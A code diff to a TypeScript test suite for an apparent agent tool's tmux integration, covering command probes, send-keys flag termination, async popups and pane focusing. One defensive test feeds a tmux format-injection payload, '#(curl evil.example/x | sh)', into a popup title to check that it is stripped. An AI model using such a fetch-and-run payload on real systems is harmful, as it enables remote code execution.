@@ -16,6 +16,18 @@ function installMockExec(scenario: (args: string[]) => string) {
   }));
 }
 
+/**
+ * True for the `commandExists` availability probe.
+ *
+ * Pins the argv shape: `/bin/sh -c "command -v 'tmux'"`. Notably `-c`, NOT
+ * `-lc` — the probe must not source the user's login profile on every call.
+ * Matching the `command -v` payload rather than a bare `-c` matters because
+ * tmux's own argv uses `-c <cwd>` for the working directory.
+ */
+function isCommandProbe(args: readonly string[]): boolean {
+  return args[0] === "-c" && (args[1] ?? "").startsWith("command -v");
+}
+
 describe("multiplexer-tmux", () => {
   afterEach(() => {
     vi.doUnmock("node:child_process");
@@ -30,8 +42,8 @@ describe("multiplexer-tmux", () => {
   it("isAvailable returns true when tmux binary exists and TMUX env var is set", async () => {
     process.env.TMUX = "/tmp/tmux-1000/default,12345,0";
     installMockExec((args) => {
-      // /bin/sh -lc "command -v 'tmux'" succeeds
-      if (args.includes("-lc")) return "";
+      // /bin/sh -c "command -v 'tmux'" succeeds
+      if (isCommandProbe(args)) return "";
       return "";
     });
     const { TmuxMultiplexer } = await importFresh<
@@ -43,7 +55,7 @@ describe("multiplexer-tmux", () => {
   it("isAvailable is binary-only: returns true even when TMUX env var is unset", async () => {
     // Symmetric with ZellijMultiplexer: isAvailable must NOT require TMUX.
     installMockExec((args) => {
-      if (args.includes("-lc")) return "";
+      if (isCommandProbe(args)) return "";
       return "";
     });
     const { TmuxMultiplexer } = await importFresh<
@@ -55,7 +67,7 @@ describe("multiplexer-tmux", () => {
   it("isAvailable returns false when tmux binary is not on PATH", async () => {
     process.env.TMUX = "/tmp/tmux-1000/default,12345,0";
     installMockExec((args) => {
-      if (args.includes("-lc")) throw new Error("command not found");
+      if (isCommandProbe(args)) throw new Error("command not found");
       return "";
     });
     const { TmuxMultiplexer } = await importFresh<
@@ -136,7 +148,7 @@ describe("multiplexer-tmux", () => {
     process.env.TMUX_PANE = "%1";
     installMockExec((args) => {
       if (args[0] === "new-window") return "42\n"; // missing % prefix
-      if (args.includes("-lc")) return ""; // commandExists
+      if (isCommandProbe(args)) return ""; // commandExists
       return "";
     });
     const { TmuxMultiplexer } = await importFresh<
@@ -236,7 +248,7 @@ describe("multiplexer-tmux", () => {
       calls.push(args);
       if (args[0] === "new-session") return `${MOCK_PANE_ID}\n`;
       if (args[0] === "rename-window") return "";
-      if (args.includes("-lc")) return ""; // commandExists
+      if (isCommandProbe(args)) return ""; // commandExists
       return "";
     });
     const { TmuxMultiplexer } = await importFresh<
@@ -281,7 +293,7 @@ describe("multiplexer-tmux", () => {
       if (args[0] === "display-message") {
         return "pi-subagent-abc12345\t1\t0\n";
       }
-      if (args.includes("-lc")) return ""; // commandExists
+      if (isCommandProbe(args)) return ""; // commandExists
       return "";
     });
     const { TmuxMultiplexer } = await importFresh<
@@ -325,7 +337,7 @@ describe("multiplexer-tmux", () => {
     delete process.env.TMUX_PANE;
     installMockExec((args) => {
       if (args[0] === "new-session") return "XX\n"; // bad format
-      if (args.includes("-lc")) return "";
+      if (isCommandProbe(args)) return "";
       return "";
     });
     const { TmuxMultiplexer } = await importFresh<
@@ -344,7 +356,7 @@ describe("multiplexer-tmux", () => {
   it("createPane relaxed path throws when tmux binary is not available", async () => {
     delete process.env.TMUX;
     installMockExec((args) => {
-      if (args.includes("-lc")) throw new Error("command not found");
+      if (isCommandProbe(args)) throw new Error("command not found");
       return "";
     });
     const { TmuxMultiplexer } = await importFresh<
@@ -467,11 +479,26 @@ describe("multiplexer-tmux", () => {
     new TmuxMultiplexer().sendKeys("%42", "echo hello");
 
     const sk = calls.find((a) => a[0] === "send-keys");
-    expect(sk).toBeDefined();
-    expect(sk).toContain("-t");
-    expect(sk).toContain("%42");
-    expect(sk).toContain("-l");
-    expect(sk).toContain("echo hello");
+    expect(sk).toEqual(["send-keys", "-t", "%42", "-l", "--", "echo hello"]);
+  });
+
+  it("sendKeys terminates flags with -- so leading-dash text is not parsed as a flag", async () => {
+    // Real tmux: `send-keys -t %42 -l "-n hi"` fails with
+    // `command send-keys: unknown flag -n` (exit 1). Follow-up text is
+    // user/model controlled, so the terminator must always be present.
+    process.env.TMUX = "/tmp/tmux-1000/default,12345,0";
+    const calls: string[][] = [];
+    installMockExec((args) => {
+      calls.push(args);
+      return "";
+    });
+    const { TmuxMultiplexer } = await importFresh<
+      typeof import("../src/multiplexer-tmux")
+    >("../src/multiplexer-tmux");
+    new TmuxMultiplexer().sendKeys("%42", "-n not-a-flag");
+
+    const sk = calls.find((a) => a[0] === "send-keys")!;
+    expect(sk[sk.indexOf("-n not-a-flag") - 1]).toBe("--");
   });
 
   it("sendKeys sends text with newlines verbatim", async () => {
@@ -648,13 +675,41 @@ describe("multiplexer-tmux", () => {
     });
   });
 
+  /**
+   * `showNativeViewer` now spawns the popup through `execFile` (async, no
+   * timeout) instead of `execFileSync`. `display-popup -E` keeps the invoking
+   * tmux client alive for the popup's entire lifetime, and the popup runs
+   * `read`, so the old synchronous call froze the whole pi process until a
+   * human pressed Enter — then the 5s exec timeout SIGTERM'd the client, the
+   * popup vanished mid-read, and the UI reported failure for an overlay that
+   * had appeared.
+   */
+  function installAsyncViewerMock(
+    onCall: (args: string[]) => Error | null,
+    calls: string[][],
+  ): void {
+    vi.resetModules();
+    vi.doMock("node:child_process", () => ({
+      execFile: (
+        _file: string,
+        args: string[],
+        callback: (error: Error | null, stdout: string) => void,
+      ) => {
+        calls.push(args);
+        const error = onCall(args);
+        if (callback) callback(error, "");
+        return { unref: () => {} };
+      },
+      execFileSync: () => {
+        throw new Error("showNativeViewer must not block the event loop");
+      },
+    }));
+  }
+
   it("opens a transient native popup only when attached to tmux", async () => {
     process.env.TMUX = "/tmp/tmux-1000/default,12345,0";
     const calls: string[][] = [];
-    installMockExec((args) => {
-      calls.push(args);
-      return "";
-    });
+    installAsyncViewerMock(() => null, calls);
     const { TmuxMultiplexer } = await importFresh<
       typeof import("../src/multiplexer-tmux")
     >("../src/multiplexer-tmux");
@@ -676,7 +731,57 @@ describe("multiplexer-tmux", () => {
     ).resolves.toBe(false);
   });
 
-  it("focusPane selects a background window from PaneRef without building attach strings", async () => {
+  it("reports failure when tmux rejects the popup (e.g. no current client)", async () => {
+    // Real tmux exits 1 with `no current client` when the target session has
+    // no attached client. A genuine spawn failure must still resolve false.
+    process.env.TMUX = "/tmp/tmux-1000/default,12345,0";
+    const calls: string[][] = [];
+    installAsyncViewerMock(() => new Error("no current client"), calls);
+    const { TmuxMultiplexer } = await importFresh<
+      typeof import("../src/multiplexer-tmux")
+    >("../src/multiplexer-tmux");
+
+    await expect(
+      new TmuxMultiplexer().showNativeViewer("Agent", "output"),
+    ).resolves.toBe(false);
+  });
+
+  it("neutralizes a tmux format-injection payload in the native popup title", async () => {
+    // A popup title is a tmux FORMAT, not a string: `#(cmd)` spawns a shell
+    // job. Verified against tmux 3.7b — `display-popup -T '#(touch /tmp/pwn)'`
+    // creates the file. The sub-agent name reaching this argument is
+    // attacker-reachable (unvalidated schema field defaulted from task text),
+    // so the `#` introducer must be gone before tmux ever sees it.
+    process.env.TMUX = "/tmp/tmux-1000/default,12345,0";
+    const calls: string[][] = [];
+    installAsyncViewerMock(() => null, calls);
+    const { TmuxMultiplexer } = await importFresh<
+      typeof import("../src/multiplexer-tmux")
+    >("../src/multiplexer-tmux");
+
+    await expect(
+      new TmuxMultiplexer().showNativeViewer(
+        "#(curl evil.example/x | sh)\r\nrogue",
+        "output",
+      ),
+    ).resolves.toBe(true);
+
+    const popup = calls[0]!;
+    const title = popup[popup.indexOf("-T") + 1]!;
+    expect(title).not.toContain("#");
+    expect(title).not.toContain("\r");
+    expect(title).not.toContain("\n");
+    expect(title).toBe("(curl evil.example/x | sh) rogue");
+  });
+
+  /**
+   * `focusPane` targets the pane id for BOTH shapes. Pane ids are
+   * tmux-server-global, so one target resolves pane + window + session. The
+   * previous `select-window -t <windowName>` dropped `ref.session` entirely:
+   * with `reviewer` windows in two sessions, real tmux returned exit 0 and
+   * switched the OTHER session — silently focusing the wrong agent.
+   */
+  it("focusPane selects a background window by server-global pane id, not by window name", async () => {
     const calls: string[][] = [];
     vi.resetModules();
     vi.doMock("node:child_process", () => ({
@@ -699,10 +804,15 @@ describe("multiplexer-tmux", () => {
 
     await new TmuxMultiplexer().focusPane({
       paneId: "%42",
-      windowName: "demo",
+      windowName: "reviewer",
+      session: "pi-subagent-abc123",
     });
 
-    expect(calls).toEqual([["select-window", "-t", "demo"]]);
+    expect(calls).toEqual([
+      ["select-window", "-t", "%42", ";", "select-pane", "-t", "%42"],
+    ]);
+    // An ambiguous bare window name must never be the target.
+    expect(calls[0]).not.toContain("reviewer");
   });
 
   it("focusPane selects a split pane by pane id", async () => {
@@ -726,7 +836,11 @@ describe("multiplexer-tmux", () => {
 
     await new TmuxMultiplexer().focusPane({ paneId: "%42" });
 
-    expect(calls).toEqual([["select-pane", "-t", "%42"]]);
+    // select-window is required even for a split: select-pane alone does not
+    // change the active window (verified against tmux 3.7b).
+    expect(calls).toEqual([
+      ["select-window", "-t", "%42", ";", "select-pane", "-t", "%42"],
+    ]);
   });
 
   it("capturePane uses tmux capture-pane and bounds output by lines and bytes", async () => {
@@ -845,7 +959,7 @@ it("createPane background throws improved diagnostic on new-window failure", asy
   vi.resetModules();
   vi.doMock("node:child_process", () => ({
     execFileSync: (_file: string, args: string[]) => {
-      if (args.includes("-lc")) return ""; // commandExists succeeds
+      if (isCommandProbe(args)) return ""; // commandExists succeeds
       if (args[0] === "new-window") {
         const err = new Error("Command failed") as Error & {
           stderr?: Buffer;
